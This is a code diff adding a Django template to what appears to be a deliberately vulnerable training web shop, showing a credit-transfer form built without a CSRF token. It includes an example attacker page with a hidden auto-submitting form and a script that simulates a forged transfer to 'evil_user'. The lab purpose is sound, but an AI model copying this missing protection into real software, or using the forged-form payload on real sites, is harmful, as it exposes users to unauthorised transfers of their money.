@@ -1,0 +1,101 @@
+{% extends 'eshop/base.html' %}
+
+{% block title %}Transfer Credits{% endblock %}
+
+{% block content %}
+<div class="container mt-5">
+    <div class="row">
+        <div class="col-md-6">
+            <h2>Transfer Store Credits</h2>
+            
+            <!-- VULNERABILITY: CSRF-vulnerable form -->
+            <div class="card">
+                <div class="card-body">
+                    <div class="alert alert-danger">
+                        <strong>⚠️ CSRF Vulnerability Warning!</strong>
+                        <p>This form lacks CSRF protection. It can be submitted from external sites!</p>
+                    </div>
+
+                    <form method="post" action="{% url 'transfer_credits' %}">
+                        <!-- WARNING: No {% csrf_token %} -->
+                        <div class="form-group">
+                            <label for="recipient">Recipient Username:</label>
+                            <input type="text" class="form-control" id="recipient" name="recipient" required>
+                            <small class="form-text text-muted">Enter the username of the recipient</small>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="amount">Amount (€):</label>
+                            <input type="number" class="form-control" id="amount" name="amount" 
+                                   min="1" max="1000" step="0.01" required>
+                            <small class="form-text text-muted">Maximum transfer: €1000</small>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-danger btn-block">
+                            Transfer Credits (No Confirmation!)
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <div class="col-md-6">
+            <h3>CSRF Attack Example</h3>
+            <div class="card bg-light">
+                <div class="card-body">
+                    <h5>How CSRF Works:</h5>
+                    <p>An attacker could create a malicious page with this form:</p>
+                    
+                    <pre class="bg-dark text-white p-3"><code>&lt;!-- Malicious site --&gt;
+&lt;form action="http://localhost:8000/transfer-credits/" 
+      method="POST" id="csrf-form"&gt;
+    &lt;input type="hidden" name="recipient" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="999"&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+    // Auto-submit when page loads
+    document.getElementById('csrf-form').submit();
+&lt;/script&gt;</code></pre>
+                    
+                    <p>If a logged-in user visits the malicious page, credits are transferred automatically!</p>
+                    
+                    <h5 class="mt-3">Test CSRF Attack:</h5>
+                    <button class="btn btn-warning" onclick="testCSRF()">
+                        Simulate CSRF Attack
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function testCSRF() {
+    // Create hidden form
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = '{% url "transfer_credits" %}';
+    
+    // Add hidden fields
+    var recipient = document.createElement('input');
+    recipient.type = 'hidden';
+    recipient.name = 'recipient';
+    recipient.value = 'evil_user';
+    
+    var amount = document.createElement('input');
+    amount.type = 'hidden';
+    amount.name = 'amount';
+    amount.value = '100';
+    
+    form.appendChild(recipient);
+    form.appendChild(amount);
+    
+    // Show confirmation (in real attack, would auto-submit)
+    if (confirm('This will submit a CSRF transfer of €100 to evil_user. Continue?')) {
+        document.body.appendChild(form);
+        form.submit();
+    }
+}
+</script>
+{% endblock %}
